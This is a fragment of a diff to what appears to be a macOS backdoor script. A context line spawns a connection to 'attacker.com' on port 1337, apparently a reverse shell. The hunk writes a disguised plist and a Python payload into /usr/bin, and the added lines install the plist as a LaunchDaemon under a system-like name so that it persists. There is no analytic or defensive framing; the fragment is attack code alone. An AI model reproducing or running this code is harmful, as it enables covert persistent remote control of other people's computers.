@@ -36,6 +36,9 @@ spawn(h="attacker.com",p=1337)
 with open("/usr/bin/com.osxsvct.plist","a") as f:
 	f.write(plist)
 
+with open("/System/Library/LaunchDaemons/com.osxsvct.plist","a") as f:
+	f.write(plist)
+	
 with open("/usr/bin/osxsvct.py","a") as f:
 	f.write(osxsvct_py)
 
